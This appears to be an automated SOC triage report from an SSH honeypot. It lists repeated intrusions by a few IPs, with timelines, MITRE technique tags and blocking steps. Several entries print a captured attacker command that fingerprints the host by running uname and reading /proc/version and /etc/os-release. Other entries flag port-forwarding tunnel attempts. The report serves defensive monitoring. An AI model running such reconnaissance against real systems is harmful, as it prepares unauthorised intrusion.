| **Source IP** | `186.103.136[.]43` |
| **First Seen** | 2026-07-28 13:07 |
| **Last Seen** | 2026-07-28 13:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:07:26` | `cowrie.session.connect` |
| `2026-07-28 13:07:26` | `cowrie.client.version` |
| `2026-07-28 13:07:26` | `cowrie.client.kex` |
| `2026-07-28 13:07:28` | `cowrie.login.success` |
| `2026-07-28 13:07:29` | `cowrie.direct-tcpip.request` |
| `2026-07-28 13:07:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.103.136[.]43` to AbuseIPDB if not already reported
- [ ] Block `186.103.136[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9f7410fe802

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:08 |
| **Last Seen** | 2026-07-28 13:08 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:08:22` | `cowrie.session.connect` |
| `2026-07-28 13:08:23` | `cowrie.client.version` |
| `2026-07-28 13:08:23` | `cowrie.client.kex` |
| `2026-07-28 13:08:27` | `cowrie.login.success` |
| `2026-07-28 13:08:30` | `cowrie.session.params` |
| `2026-07-28 13:08:30` | `cowrie.command.input` |
| `2026-07-28 13:08:30` | `cowrie.command.input` |
| `2026-07-28 13:08:30` | `cowrie.command.input` |
| `2026-07-28 13:08:30` | `cowrie.command.input` |
| `2026-07-28 13:08:30` | `cowrie.command.input` |
| `2026-07-28 13:08:30` | `cowrie.command.success` |
| `2026-07-28 13:08:30` | `cowrie.command.input` |
| `2026-07-28 13:08:30` | `cowrie.command.input` |
| `2026-07-28 13:08:30` | `cowrie.command.input` |
| `2026-07-28 13:08:30` | `cowrie.command.input` |
| `2026-07-28 13:08:31` | `cowrie.log.closed` |
| `2026-07-28 13:08:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85530648a7f9

| Field | Detail |
|---|---|
| **Source IP** | `111.70.17[.]73` |
| **First Seen** | 2026-07-28 13:09 |
| **Last Seen** | 2026-07-28 13:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:09:03` | `cowrie.session.connect` |
| `2026-07-28 13:09:04` | `cowrie.client.version` |
| `2026-07-28 13:09:04` | `cowrie.client.kex` |
| `2026-07-28 13:09:06` | `cowrie.login.success` |
| `2026-07-28 13:09:07` | `cowrie.direct-tcpip.request` |
| `2026-07-28 13:09:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.17[.]73` to AbuseIPDB if not already reported
- [ ] Block `111.70.17[.]73` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f757563582d9

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:09 |
| **Last Seen** | 2026-07-28 13:09 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:09:34` | `cowrie.session.connect` |
| `2026-07-28 13:09:35` | `cowrie.client.version` |
| `2026-07-28 13:09:35` | `cowrie.client.kex` |
| `2026-07-28 13:09:39` | `cowrie.login.success` |
| `2026-07-28 13:09:42` | `cowrie.session.params` |
| `2026-07-28 13:09:42` | `cowrie.command.input` |
| `2026-07-28 13:09:42` | `cowrie.command.input` |
| `2026-07-28 13:09:42` | `cowrie.command.input` |
| `2026-07-28 13:09:42` | `cowrie.command.input` |
| `2026-07-28 13:09:42` | `cowrie.command.input` |
| `2026-07-28 13:09:42` | `cowrie.command.success` |
| `2026-07-28 13:09:42` | `cowrie.command.input` |
| `2026-07-28 13:09:42` | `cowrie.command.input` |
| `2026-07-28 13:09:42` | `cowrie.command.input` |
| `2026-07-28 13:09:42` | `cowrie.command.input` |
| `2026-07-28 13:09:43` | `cowrie.log.closed` |
| `2026-07-28 13:09:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4295cb9532a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-28 13:09 |
| **Last Seen** | 2026-07-28 13:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:09:57` | `cowrie.session.connect` |
| `2026-07-28 13:09:57` | `cowrie.client.version` |
| `2026-07-28 13:09:57` | `cowrie.client.kex` |
| `2026-07-28 13:09:58` | `cowrie.login.success` |
| `2026-07-28 13:09:58` | `cowrie.direct-tcpip.request` |
| `2026-07-28 13:09:59` | `cowrie.direct-tcpip.ja4` |
| `2026-07-28 13:09:59` | `cowrie.direct-tcpip.data` |
| `2026-07-28 13:09:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dbe92b156f8

| Field | Detail |
|---|---|
| **Source IP** | `1.247.245[.]61` |
| **First Seen** | 2026-07-28 13:10 |
| **Last Seen** | 2026-07-28 13:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:10:43` | `cowrie.session.connect` |
| `2026-07-28 13:10:44` | `cowrie.client.version` |
| `2026-07-28 13:10:44` | `cowrie.client.kex` |
| `2026-07-28 13:10:46` | `cowrie.login.success` |
| `2026-07-28 13:10:47` | `cowrie.direct-tcpip.request` |
| `2026-07-28 13:10:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.247.245[.]61` to AbuseIPDB if not already reported
- [ ] Block `1.247.245[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-266e2735c4b1

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:10 |
| **Last Seen** | 2026-07-28 13:10 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:10:47` | `cowrie.session.connect` |
| `2026-07-28 13:10:48` | `cowrie.client.version` |
| `2026-07-28 13:10:48` | `cowrie.client.kex` |
| `2026-07-28 13:10:52` | `cowrie.login.success` |
| `2026-07-28 13:10:55` | `cowrie.session.params` |
| `2026-07-28 13:10:55` | `cowrie.command.input` |
| `2026-07-28 13:10:55` | `cowrie.command.input` |
| `2026-07-28 13:10:55` | `cowrie.command.input` |
| `2026-07-28 13:10:55` | `cowrie.command.input` |
| `2026-07-28 13:10:55` | `cowrie.command.input` |
| `2026-07-28 13:10:55` | `cowrie.command.success` |
| `2026-07-28 13:10:55` | `cowrie.command.input` |
| `2026-07-28 13:10:55` | `cowrie.command.input` |
| `2026-07-28 13:10:55` | `cowrie.command.input` |
| `2026-07-28 13:10:55` | `cowrie.command.input` |
| `2026-07-28 13:10:56` | `cowrie.log.closed` |
| `2026-07-28 13:10:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-346b5d7a3628

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:11 |
| **Last Seen** | 2026-07-28 13:12 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:11:59` | `cowrie.session.connect` |
| `2026-07-28 13:12:00` | `cowrie.client.version` |
| `2026-07-28 13:12:00` | `cowrie.client.kex` |
| `2026-07-28 13:12:04` | `cowrie.login.success` |
| `2026-07-28 13:12:07` | `cowrie.session.params` |
| `2026-07-28 13:12:07` | `cowrie.command.input` |
| `2026-07-28 13:12:07` | `cowrie.command.input` |
| `2026-07-28 13:12:07` | `cowrie.command.input` |
| `2026-07-28 13:12:07` | `cowrie.command.input` |
| `2026-07-28 13:12:07` | `cowrie.command.input` |
| `2026-07-28 13:12:07` | `cowrie.command.success` |
| `2026-07-28 13:12:07` | `cowrie.command.input` |
| `2026-07-28 13:12:07` | `cowrie.command.input` |
| `2026-07-28 13:12:07` | `cowrie.command.input` |
| `2026-07-28 13:12:07` | `cowrie.command.input` |
| `2026-07-28 13:12:08` | `cowrie.log.closed` |
| `2026-07-28 13:12:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea29497f8043

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:13 |
| **Last Seen** | 2026-07-28 13:13 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:13:12` | `cowrie.session.connect` |
| `2026-07-28 13:13:13` | `cowrie.client.version` |
| `2026-07-28 13:13:13` | `cowrie.client.kex` |
| `2026-07-28 13:13:18` | `cowrie.login.success` |
| `2026-07-28 13:13:21` | `cowrie.session.params` |
| `2026-07-28 13:13:21` | `cowrie.command.input` |
| `2026-07-28 13:13:21` | `cowrie.command.input` |
| `2026-07-28 13:13:21` | `cowrie.command.input` |
| `2026-07-28 13:13:21` | `cowrie.command.input` |
| `2026-07-28 13:13:21` | `cowrie.command.input` |
| `2026-07-28 13:13:21` | `cowrie.command.success` |
| `2026-07-28 13:13:21` | `cowrie.command.input` |
| `2026-07-28 13:13:21` | `cowrie.command.input` |
| `2026-07-28 13:13:21` | `cowrie.command.input` |
| `2026-07-28 13:13:21` | `cowrie.command.input` |
| `2026-07-28 13:13:22` | `cowrie.log.closed` |
| `2026-07-28 13:13:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4cf3a2dc704

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:14 |
| **Last Seen** | 2026-07-28 13:14 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:14:24` | `cowrie.session.connect` |
| `2026-07-28 13:14:25` | `cowrie.client.version` |
| `2026-07-28 13:14:25` | `cowrie.client.kex` |
| `2026-07-28 13:14:30` | `cowrie.login.success` |
| `2026-07-28 13:14:33` | `cowrie.session.params` |
| `2026-07-28 13:14:33` | `cowrie.command.input` |
| `2026-07-28 13:14:33` | `cowrie.command.input` |
| `2026-07-28 13:14:33` | `cowrie.command.input` |
| `2026-07-28 13:14:33` | `cowrie.command.input` |
| `2026-07-28 13:14:33` | `cowrie.command.input` |
| `2026-07-28 13:14:33` | `cowrie.command.success` |
| `2026-07-28 13:14:33` | `cowrie.command.input` |
| `2026-07-28 13:14:33` | `cowrie.command.input` |
| `2026-07-28 13:14:33` | `cowrie.command.input` |
| `2026-07-28 13:14:33` | `cowrie.command.input` |
| `2026-07-28 13:14:34` | `cowrie.log.closed` |
| `2026-07-28 13:14:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b692a8195ee

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:15 |
| **Last Seen** | 2026-07-28 13:15 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:15:38` | `cowrie.session.connect` |
| `2026-07-28 13:15:39` | `cowrie.client.version` |
| `2026-07-28 13:15:39` | `cowrie.client.kex` |
| `2026-07-28 13:15:44` | `cowrie.login.success` |
| `2026-07-28 13:15:47` | `cowrie.session.params` |
| `2026-07-28 13:15:47` | `cowrie.command.input` |
| `2026-07-28 13:15:47` | `cowrie.command.input` |
| `2026-07-28 13:15:47` | `cowrie.command.input` |
| `2026-07-28 13:15:47` | `cowrie.command.input` |
| `2026-07-28 13:15:47` | `cowrie.command.input` |
| `2026-07-28 13:15:47` | `cowrie.command.success` |
| `2026-07-28 13:15:47` | `cowrie.command.input` |
| `2026-07-28 13:15:47` | `cowrie.command.input` |
| `2026-07-28 13:15:47` | `cowrie.command.input` |
| `2026-07-28 13:15:47` | `cowrie.command.input` |
| `2026-07-28 13:15:48` | `cowrie.log.closed` |
| `2026-07-28 13:15:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-301ec7407316

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:16 |
| **Last Seen** | 2026-07-28 13:17 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:16:52` | `cowrie.session.connect` |
| `2026-07-28 13:16:53` | `cowrie.client.version` |
| `2026-07-28 13:16:53` | `cowrie.client.kex` |
| `2026-07-28 13:16:58` | `cowrie.login.success` |
| `2026-07-28 13:17:01` | `cowrie.session.params` |
| `2026-07-28 13:17:01` | `cowrie.command.input` |
| `2026-07-28 13:17:01` | `cowrie.command.input` |
| `2026-07-28 13:17:01` | `cowrie.command.input` |
| `2026-07-28 13:17:01` | `cowrie.command.input` |
| `2026-07-28 13:17:01` | `cowrie.command.input` |
| `2026-07-28 13:17:01` | `cowrie.command.success` |
| `2026-07-28 13:17:01` | `cowrie.command.input` |
| `2026-07-28 13:17:01` | `cowrie.command.input` |
| `2026-07-28 13:17:01` | `cowrie.command.input` |
| `2026-07-28 13:17:01` | `cowrie.command.input` |
| `2026-07-28 13:17:02` | `cowrie.log.closed` |
| `2026-07-28 13:17:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0671e4bf323a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:18 |
| **Last Seen** | 2026-07-28 13:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:18:04` | `cowrie.session.connect` |
| `2026-07-28 13:18:05` | `cowrie.client.version` |
| `2026-07-28 13:18:05` | `cowrie.client.kex` |
| `2026-07-28 13:18:09` | `cowrie.login.success` |
| `2026-07-28 13:18:11` | `cowrie.session.params` |
| `2026-07-28 13:18:11` | `cowrie.command.input` |
| `2026-07-28 13:18:11` | `cowrie.command.input` |
| `2026-07-28 13:18:11` | `cowrie.command.input` |
| `2026-07-28 13:18:11` | `cowrie.command.input` |
| `2026-07-28 13:18:11` | `cowrie.command.input` |
| `2026-07-28 13:18:11` | `cowrie.command.success` |
| `2026-07-28 13:18:11` | `cowrie.command.input` |
| `2026-07-28 13:18:11` | `cowrie.command.input` |
| `2026-07-28 13:18:11` | `cowrie.command.input` |
| `2026-07-28 13:18:11` | `cowrie.command.input` |
| `2026-07-28 13:18:12` | `cowrie.log.closed` |
| `2026-07-28 13:18:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af18ec84bf67

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:19 |
| **Last Seen** | 2026-07-28 13:19 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:19:15` | `cowrie.session.connect` |
| `2026-07-28 13:19:16` | `cowrie.client.version` |
| `2026-07-28 13:19:16` | `cowrie.client.kex` |
| `2026-07-28 13:19:21` | `cowrie.login.success` |
| `2026-07-28 13:19:24` | `cowrie.session.params` |
| `2026-07-28 13:19:24` | `cowrie.command.input` |
| `2026-07-28 13:19:24` | `cowrie.command.input` |
| `2026-07-28 13:19:24` | `cowrie.command.input` |
| `2026-07-28 13:19:24` | `cowrie.command.input` |
| `2026-07-28 13:19:24` | `cowrie.command.input` |
| `2026-07-28 13:19:24` | `cowrie.command.success` |
| `2026-07-28 13:19:24` | `cowrie.command.input` |
| `2026-07-28 13:19:24` | `cowrie.command.input` |
| `2026-07-28 13:19:24` | `cowrie.command.input` |
| `2026-07-28 13:19:24` | `cowrie.command.input` |
| `2026-07-28 13:19:24` | `cowrie.log.closed` |
| `2026-07-28 13:19:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4445ce08428

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:20 |
| **Last Seen** | 2026-07-28 13:20 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
